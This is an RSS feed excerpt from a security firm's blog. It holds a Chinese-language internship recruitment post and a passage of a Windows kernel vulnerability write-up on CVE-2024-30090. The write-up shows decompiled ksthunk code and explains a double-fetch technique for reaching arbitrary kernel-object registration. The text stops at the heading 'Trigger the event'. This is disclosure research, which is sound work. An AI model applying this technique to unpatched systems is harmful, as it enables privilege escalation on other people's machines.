                <link>https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi/</link>
                <guid>https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi</guid>
                <pubDate>Thu, 09 Jan 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2025 第七屆實習生計畫</title>
                <description>&lt;p&gt;DEVCORE 創立迄今已逾十年，持續專注於提供主動式資安服務，並致力尋找各種安全風險及漏洞，讓世界變得更安全。為了持續尋找更多擁有相同理念的資安新銳、協助學生建構正確資安意識及技能，我們成立了「戴夫寇爾全國資訊安全獎學金」，亦於 2022 年初舉辦首屆實習生計畫，目前為止成果頗豐、超乎預期。&lt;/p&gt;

&lt;p&gt;我們很榮幸地宣佈，第七屆實習生計畫將於 2025 三月登場，即日起正式開放報名！為了讓同學們有更充裕的準備時間並獲得更好的實習體驗，本屆在時程上做了一些調整：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;延長報名時間，並採取更彈性的申請方式，讓同學能充分展現自身實力&lt;/li&gt;
  &lt;li&gt;提早公布結果，讓同學更靈活地規劃後續行程&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;此外，我們也延續了上一屆的分組方式，讓同學們能根據興趣與專長選擇合適的組別：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Research 組：適合對漏洞研究有興趣、想挖掘真實漏洞的同學&lt;/li&gt;
  &lt;li&gt;Red Team 組：適合對紅隊技術有興趣、想精進滲透技巧的同學&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;若您期待加入我們、精進資安技能，煩請詳閱下列資訊後填寫表單報名！&lt;/p&gt;

&lt;h3 id=&quot;實習內容&quot;&gt;實習內容&lt;/h3&gt;

&lt;p&gt;本次實習分為 Research 及 Red Team 兩個組別，主要內容如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Research (Binary/Web)
以研究為主，在與導師確定研究標的後，分析目標架構、進行逆向工程或程式碼審查。藉由這個過程訓練自己的思路，找出可能的攻擊面與潛在的弱點。另外也會讓大家嘗試分析及撰寫過往漏洞的 Exploit，理解過去漏洞都出現在哪，體驗真實世界的漏洞都是如何利用。
    &lt;ul&gt;
      &lt;li&gt;漏洞挖掘及研究 60 %&lt;/li&gt;
      &lt;li&gt;1-day 開發 (Exploitation) 30 %&lt;/li&gt;
      &lt;li&gt;成果報告與準備 10 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Red Team
研究並深入學習紅隊常用技巧，熟悉實戰中會遇到的情境、語言與架構。了解常見漏洞的成因、實際利用方法、嚴苛條件下的利用策略、黑箱測試方式及各種奇技淫巧。學習後滲透時的常見限制、工具概念與原理。
    &lt;ul&gt;
      &lt;li&gt;漏洞與技巧的研究及深入學習 70 %&lt;/li&gt;
      &lt;li&gt;Lab 建置或 Bug Bounty 或漏洞挖掘 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;公司地點&quot;&gt;公司地點&lt;/h3&gt;

&lt;p&gt;台北市松山區八德路三段 32 號 13 樓&lt;/p&gt;

&lt;h3 id=&quot;實習時間&quot;&gt;實習時間&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2025 年 3 月初到 2025 年 7 月底，共 5 個月&lt;/li&gt;
  &lt;li&gt;每週工作兩天，工作時間為 10:00 – 18:00
    &lt;ul&gt;
      &lt;li&gt;其中一天 14:00 - 18:00 必須到公司同步進度，其餘時間為遠端作業&lt;/li&gt;
      &lt;li&gt;如果居住雙北外可彈性調整同步方式，但須每個組別統一&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;招募對象&quot;&gt;招募對象&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;具有一定程度資安背景的學生，且可每週工作兩天&lt;/li&gt;
  &lt;li&gt;無其他招募限制，歷屆實習生可重複應徵&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;預計招收名額&quot;&gt;預計招收名額&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Research 組：2~3 人&lt;/li&gt;
  &lt;li&gt;Red Team 組：2~3 人&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;薪資待遇&quot;&gt;薪資待遇&lt;/h3&gt;

&lt;p&gt;每月新台幣 18,000 元（另補助部分交通費）&lt;/p&gt;

&lt;h2 id=&quot;招募條件資格與流程&quot;&gt;招募條件資格與流程&lt;/h2&gt;

&lt;h3 id=&quot;實習條件要求&quot;&gt;實習條件要求&lt;/h3&gt;

&lt;h4 id=&quot;research-binaryweb&quot;&gt;Research (Binary/Web)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;基本漏洞利用及挖掘能力&lt;/li&gt;
  &lt;li&gt;具備研究熱誠，習慣了解技術本質&lt;/li&gt;
  &lt;li&gt;熟悉任一種 Scripting Language（如：Shell Script、Python、Ruby），並能使用腳本輔以研究&lt;/li&gt;
  &lt;li&gt;具備除錯能力，能善用 Debugger 追蹤程式流程、能重現並收斂問題&lt;/li&gt;
  &lt;li&gt;具備獨立分析開放原始碼專案的能力，能透過分析程式碼理解目標專案的架構&lt;/li&gt;
  &lt;li&gt;熟悉並理解常見的漏洞成因
    &lt;ul&gt;
      &lt;li&gt;OWASP Web Top 10&lt;/li&gt;
      &lt;li&gt;Memory Corruption&lt;/li&gt;
      &lt;li&gt;Race Condition&lt;/li&gt;
      &lt;li&gt;…&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;加分但&lt;strong&gt;非必要&lt;/strong&gt;條件
    &lt;ul&gt;
      &lt;li&gt;CTF 比賽經驗&lt;/li&gt;
      &lt;li&gt;pwnable.tw 成績&lt;/li&gt;
      &lt;li&gt;有公開的技術 blog/slide、write-ups 或是演講&lt;/li&gt;
      &lt;li&gt;精通 IDA Pro 或 Ghidra&lt;/li&gt;
      &lt;li&gt;熟悉任一種網頁程式語言或框架（如：PHP、ASP.NET、Express.js），具備可以建立完整網頁服務的能力&lt;/li&gt;
      &lt;li&gt;理解 &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; 中的安全議題&lt;/li&gt;
      &lt;li&gt;獨立挖掘過 0-day 漏洞，或分析過 1-day 的經驗&lt;/li&gt;
      &lt;li&gt;具備下列其中之一經驗
        &lt;ul&gt;
          &lt;li&gt;Web Application Exploit&lt;/li&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;red-team&quot;&gt;Red Team&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;必要條件
    &lt;ul&gt;
      &lt;li&gt;熟悉 OWASP Web Top 10&lt;/li&gt;
      &lt;li&gt;理解 &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; 中所有的安全議題或已完成所有 Lab&lt;/li&gt;
      &lt;li&gt;理解計算機網路的基本概念&lt;/li&gt;
      &lt;li&gt;熟悉任一種網頁程式開發方式（如：PHP、ASP.NET、JSP），具備可以建立完整網頁服務的能力&lt;/li&gt;
      &lt;li&gt;熟悉任一種 Scripting Language（如：Shell Script、Python、Ruby），並能使用腳本輔以研究&lt;/li&gt;
      &lt;li&gt;具備除錯能力，能善用 Debugger 追蹤程式流程、能重現並收斂問題&lt;/li&gt;
      &lt;li&gt;具備可以建置、設定常見伺服器（如：Nginx、Apache、Tomcat、IIS、Active Directory）及作業系統（如：Linux、Windows）的能力&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;加分但&lt;strong&gt;非必要&lt;/strong&gt;條件
    &lt;ul&gt;
      &lt;li&gt;曾經獨立挖掘過 0-day 漏洞&lt;/li&gt;
      &lt;li&gt;曾經獨立分析過已知漏洞並能撰寫 1-day Exploit&lt;/li&gt;
      &lt;li&gt;曾經於 CTF 比賽中擔任出題者並建置過題目&lt;/li&gt;
      &lt;li&gt;擁有 OSCP 證照或同等能力之證照&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;應徵流程&quot;&gt;應徵流程&lt;/h3&gt;

&lt;p&gt;本次甄選一共分為二個階段：&lt;/p&gt;

&lt;h4 id=&quot;第一階段書面審查&quot;&gt;第一階段：書面審查&lt;/h4&gt;

&lt;p&gt;第一階段為書面審查，會需要審查下列兩個項目&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;履歷內容&lt;/li&gt;
  &lt;li&gt;簡答題答案
    &lt;ul&gt;
      &lt;li&gt;應徵 Research 實習生：
        &lt;ul&gt;
          &lt;li&gt;題目一：漏洞重現與分析過程
            &lt;ul&gt;
              &lt;li&gt;請提出一個，你印象最深刻或感到有趣、於西元 2022 ~ 2025 年間公開的真實漏洞或攻擊鏈案例，並依自己的理解詳述說明漏洞的成因、利用條件和可以造成的影響。同時，嘗試描述如何復現此漏洞或攻擊鏈，即使無法成功復現，也請記錄研究過程。報告撰寫請參考&lt;a href=&quot;/assets/files/recruit/DEVCORE-intern_vulnerability_analysis_example.pdf&quot;&gt;範本&lt;/a&gt;，盡可能詳細，中英不限。&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;題目二：實習期間想要研究的主題
            &lt;ul&gt;
              &lt;li&gt;請提出三個可能選擇的明確主題，並簡單說明提出的理由或想完成的內容，例如：
                &lt;ul&gt;
                  &lt;li&gt;研究◯◯開源軟體，找到可 RCE 的重大風險弱點。&lt;/li&gt;
                  &lt;li&gt;研究常見的路由器，目標包括：AA-123 路由器、BB-456 無線路由器。&lt;/li&gt;
                  &lt;li&gt;研究常見的筆記平台或軟體，目標包括：XX Note、YY Note。&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;應徵 Red Team 實習生：
        &lt;ul&gt;
          &lt;li&gt;請提出兩個於西元 2022 ~ 2025 年間公開的、與 Web 攻擊面、紅隊手法、漏洞或攻擊鏈相關的技術演講，請說明為什麼挑選這些演講並解釋它們為什麼有趣。
            &lt;ul&gt;
              &lt;li&gt;請用你的理解重新以文字詳細解釋這些演講的技術細節，整理成一份 Write-up 以 PDF 格式輸出，並提供任何你覺得可以輔助或證明你理解的附加資料。&lt;/li&gt;
              &lt;li&gt;這些演講可以來自包含但不限於 Black Hat、DEF CON、OffensiveCon、POC、ZeroConf、Hexacon、HITCON、TROOPERS CONFERENCE 等會議。&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;第二階段面試&quot;&gt;第二階段：面試&lt;/h4&gt;

&lt;p&gt;此階段為 30~120 分鐘（依照組別需求而定，會另行通知）的面試，會有 2~3 位資深夥伴參與，評估您是否具備本次實習所需的技術能力與人格特質。&lt;/p&gt;

&lt;h4 id=&quot;時間軸&quot;&gt;時間軸&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;2024/12/02 - 2025/01/05 公開招募，接收履歷與第一階段審核&lt;/li&gt;
  &lt;li&gt;2025/01/06 - 2025/01/23 第二階段面試（若報名踴躍會提前開始面試）&lt;/li&gt;
  &lt;li&gt;2025/01/24 前回應結果&lt;/li&gt;
  &lt;li&gt;2025/03/03 第七屆實習計畫於當週開始&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;報名方式&quot;&gt;報名方式&lt;/h3&gt;

&lt;p&gt;為了讓有意參加實習計畫的同學有更多時間準備，我們這次嘗試使用 Google 表單作為報名平台。您可以透過填寫表單進行報名，且在截止時間 &lt;strong&gt;2025/01/05 23:59&lt;/strong&gt; 以前，您可以隨時編輯已提交的表單，或是重新填寫一份新的表單來更新報名資訊。請注意，我們會以&lt;strong&gt;最後一次&lt;/strong&gt;提交的表單內容作為審核依據。&lt;/p&gt;

&lt;p&gt;請於 &lt;strong&gt;2025/01/05 23:59&lt;/strong&gt; 前完成填寫 &lt;a href=&quot;https://forms.gle/CWW7aeebXXVt3kjv6&quot;&gt;Google 表單&lt;/a&gt;並上傳相關附件。以下為填寫表單的注意事項：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;檔案經上傳後無法刪除或修改，欲更新檔案請重新填寫一份表單&lt;/li&gt;
  &lt;li&gt;請務必於&lt;strong&gt;截止時間（2025/01/06 23:59）&lt;/strong&gt; 前完成所有表單填寫與檔案上傳，逾期未完成者將視同放棄應徵資格&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;報名截止後，我們會根據您提交的報名內容進行第一階段審核。審核結果將於 &lt;strong&gt;2025/01/13&lt;/strong&gt; 前通知，並安排進一步的面試。最終錄取名單將於 &lt;strong&gt;2025/01/24&lt;/strong&gt; 公佈，我們也會同步通知錄取情況。&lt;/p&gt;

&lt;p&gt;若有應徵相關問題，請一律寄信到 recruiting_intern@devco.re，如造成您的不便請見諒，我們感謝您的來信，並期待您的加入！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/12/02/7th-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2024/12/02/7th-internship-program-recruit</guid>
                <pubDate>Mon, 02 Dec 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part II</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;這是一系列有關 Kernel Streaming 的相關的漏洞研究，建議先閱讀以下文章&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/&quot;&gt;Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在先前 Proxying to Kernel 的研究中，我們在 Kernel Streaming 中找到了多個漏洞以及一個被忽視的 Bug Class，並在今年 Pwn2Own Vancouver 2024 中利用漏洞 &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/#cve-2024-35250&quot;&gt;CVE-2024-35250&lt;/a&gt; 及 &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/#cve-2024-30084&quot;&gt;CVE-2024-30084&lt;/a&gt; 成功攻下 Windows 11。&lt;/p&gt;

&lt;p&gt;而在這篇研究中，我們將繼續延續這個攻擊面和這個 Bug Class，也將揭露另外一個漏洞和利用手法，亦發表於 &lt;a href=&quot;https://www.hexacon.fr/conference/speakers/&quot;&gt;HEXACON 2024&lt;/a&gt; 中。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;在 Pwn2Own Vancouver 2024 之後，我們繼續針對 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!KsSynchronousIoControlDevice&lt;/code&gt; 這個 bug pattern 去看看有沒有其他安全性上的問題，然而找了一段時間後，針對 KS Object 的 Property 操作中，並沒有找到其他可以利用的點，因而我們將方向轉往另外一個功能 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-events&quot;&gt;KS Event&lt;/a&gt; 上。&lt;/p&gt;

&lt;h2 id=&quot;ks-event&quot;&gt;KS Event&lt;/h2&gt;
&lt;p&gt;KS Event 與前一篇提到的 KS Property 類似。KS Object 中除了有自己的 Property Set 之外，也有提供設定 KS Event 的功能，比如說你可以設定設備狀態改變或是每個一段時間就觸發 Event，方便播放軟體等開發者定義後續的行為，而每個 KS Event 就如同 Property 一樣，要使用就必須該 KS Object 有支援。我們可以透過 &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_enable_event&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/a&gt;  及 &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_disable_event&quot;&gt;IOCTL_KS_DISABLE_EVENT&lt;/a&gt; 來註冊或關閉這些 Event。&lt;/p&gt;

&lt;h3 id=&quot;kseventdata&quot;&gt;KSEVENTDATA&lt;/h3&gt;
&lt;p&gt;而在註冊 KS Event 時，你可以藉由提供 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ns-ks-kseventdata&quot;&gt;KSEVENTDATA&lt;/a&gt; 來註冊你想要的事件，其中可以提供 EVENT_HANDLE 及 SEMAPHORE_HANDLE 等 handle 來註冊，當 KS 觸發這個事件時，就會藉由這個 handle 來通知你。&lt;/p&gt;

&lt;h3 id=&quot;the-work-flow-of-ioctl_ks_enable_event&quot;&gt;The work flow of IOCTL_KS_ENABLE_EVENT&lt;/h3&gt;
&lt;p&gt;其整個運作流程也與 IOCTL_KS_PROPERTY 雷同，在呼叫 DeviceIoControl 時，就會像下圖一樣，將使用者的 requests 依序給相對應的 driver 來處理&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;同樣會在第 3 步時做 32-bit 的 requests 轉換成 64-bit 的 requests。到第 6 步時 ks.sys 就會根據你 requests 的 Event 來決定要交給哪個 driver 及 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/nc-ks-pfnksaddevent&quot;&gt;addhandler&lt;/a&gt; 來處理你的 request。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最終再轉發給相對應的 Driver。如上圖中最後轉發給 ks 中的 KsiDefaultClockAddMarkEvent 來&lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-kesettimerex&quot;&gt;設置 Timer&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;在了解了 KS Event 功能及流程後，根據之前的 &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/#the-new-bug-pattern&quot;&gt;bug pattern&lt;/a&gt; 很快地又找到了一個可以利用的漏洞 &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-30090&quot;&gt;CVE-2024-30090&lt;/a&gt;。&lt;/p&gt;

&lt;h2 id=&quot;proxying-to-kernel-again-&quot;&gt;Proxying to kernel again !&lt;/h2&gt;
&lt;p&gt;這次的問題點發生在 ksthunk 將 32-bit request 轉換成 64-bit request 的過程。&lt;/p&gt;

&lt;p&gt;如下圖，當 ksthunk 接收到來自 WoW64 Process 的 IOCTL_KS_ENABLE_EVENT 時，會進行 32-bit 結構到 64-bit 結構的轉換
&lt;img src=&quot;/assets/img/blog/20241005/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;轉換過程會呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk!CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; 來處理&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSAutomationThunk::ThunkEnableEventIrp(__int64 ioctlcode_d, PIRP irp, __int64 a3, int *a4)
{
  ...
  if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLE
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ONESHOT
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLEBUFFERED )  
  {
    // Convert 32-bit requests and pass down directly
  }
  else if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_QUERYBUFFER ) 
  {
    ...
    newinputbuf = (KSEVENT *)ExAllocatePoolWithTag((POOL_TYPE)0x600, (unsigned int)(inputbuflen + 8), &apos;bqSK&apos;);
    ...
    memcpy(newinputbuf,Type3InputBuffer,0x28);  //------------------------[1]
    ...
    v18 = KsSynchronousIoControlDevice( 
            v25-&amp;gt;FileObject,
            0,
            IOCTL_KS_ENABLE_EVENT,
            newinputbuf,
            inputbuflen + 8,
            OutBuffer,
            outbuflen,
            &amp;amp;BytesReturned);  //-----------------[2]
    ...
  }
  ...
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;而在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; 中，明顯可以看到類似的 bug pattern，從 [1] 中可以看到，它會複製使用者的輸入到新分配出來的 Buffer 中，接著在 [2] 處，就會利用該 Buffer 來使用 KsSynchronousIoControlDevice 呼叫新的 IOCTL，。其中 newinputbuf 及 OutBuffer 都是使用者所傳入的內容。&lt;/p&gt;

&lt;p&gt;呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; 時的流程，大概如下圖所示 :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 WoW64 的程式中呼叫 IOCTL 時，可以看到圖中第 2 步 I/O Manager 會將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; 設成 UserMode(1)，而在第 3 步時，ksthunk 會將使用者的 request 從 32-bit 轉換成 64-bit，這邊就會用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; 來處理。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;之後第 5 步，就會透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; 重新呼叫 IOCTL ，而此時新的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; 就變成了 KernelMode(0) 了，而後續的處理就如一般的 IOCTL_KS_ENABLE_EVENT 相同，就不另外詳述了，總之我們到這裡已經有個可以任意做 IOCTL_KS_ENABLE_EVENT 的 primitive 了，接下來我們必須尋找看看是否有可以 EoP 的地方。&lt;/p&gt;

&lt;h2 id=&quot;the-exploitation&quot;&gt;The Exploitation&lt;/h2&gt;
&lt;p&gt;跟先前思路一樣，一開始還是會先分析入口點 ksthunk，然而我們找尋了一陣子之後，並沒有看到可以做為提權的地方，而且在 ksthunk 中，大多數只要看到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestMode&lt;/code&gt; 是 KernelMode(0) 就會直接往下傳遞而不另外做處理。因此我們將我們的目標轉向位在下一層的 ks，看看它在處理 event 的過程中，是否有可以用來提權的地方。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;很快的就找到一個吸引我們目光的地方：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 KspEnableEvent 的 Handler 中，有一處會先判斷你所傳入的 KSEVENTDATA 中的 NotificationType 來決定要怎麼註冊及處理你的事件，在一般情況下通常是給一個 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventa&quot;&gt;EVENT_HANDLE&lt;/a&gt; 或是 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createsemaphorea&quot;&gt;SEMAPHORE_HANDLE&lt;/a&gt;，然而在 ks 中，如果是從 KernelMode 呼叫的就給以提供 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/event-objects&quot;&gt;Event Object&lt;/a&gt; 甚至 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-dpc-objects&quot;&gt;DPC&lt;/a&gt; 來註冊你的事件，讓整體的處理上更有效率。&lt;/p&gt;

&lt;p&gt;也就是說我們可以藉由這個 KernelMode 的 DeviceIoControl 的 primitive 來提供任意 Kernel Object，讓它做後續處理，構造的好就有機會達成 EoP 但要看後續怎麼使用這個 Object 就是了。&lt;/p&gt;

&lt;p&gt;但是我們在嘗試了一段時間後發現到……&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSAutomationThunk::ThunkEnableEventIrp(__int64 ioctlcode_d, PIRP irp, __int64 a3, int *a4)
{
  ...
  if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLE
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ONESHOT
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLEBUFFERED )  //-------[3]
  {
    // Convert 32-bit requests and pass down directly
  }
  else if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_QUERYBUFFER ) //-------[4]
  {
    ...
    newinputbuf = (KSEVENT *)ExAllocatePoolWithTag((POOL_TYPE)0x600, (unsigned int)(inputbuflen + 8), &apos;bqSK&apos;);
    ...
    memcpy(newinputbuf,Type3InputBuffer,0x28); //------[5] 
    ...
    v18 = KsSynchronousIoControlDevice( 
            v25-&amp;gt;FileObject,
            0,
            IOCTL_KS_ENABLE_EVENT,
            newinputbuf,
            inputbuflen + 8,
            OutBuffer,
            outbuflen,
            &amp;amp;BytesReturned);  
    ...
  }
  ...
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果要提供任意 Kernel Object 去註冊事件，那麼 IOCTL 中所給定的 &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/stream/ksevent-structure&quot;&gt;KSEVENT&lt;/a&gt; 的 flag，必須要是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_ENABLE&lt;/code&gt;，也就是上面程式碼 [3] 的部分，然而在程式碼片段 [4] 處是觸發漏洞的地方卻是要是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt;，並沒辦法如我們所想的一樣直接給一個 Kernel Object。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然而幸運的是整個 IOCTL_KS_ENABLE_EVENT 也是使用 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-neither-buffered-nor-direct-i-o&quot;&gt;Neither I/O&lt;/a&gt; 直接拿使用者的 Input buffer 來做資料上的處理，&lt;strong&gt;再次&lt;/strong&gt;出現了 Double Fetch 的問題。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如上圖中所示，我們可以在呼叫 IOCTL 前把 flag 設置成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt;，檢查時就會以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt; 的功能處理，而在第二次呼叫 IOCTL 前，就把 flag 換成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_ENABLE&lt;/code&gt;，這樣就可以成功觸發漏洞並構造特定的 Kernel Object 來註冊事件了。&lt;/p&gt;

&lt;h3 id=&quot;trigger-the-event&quot;&gt;Trigger the event&lt;/h3&gt;
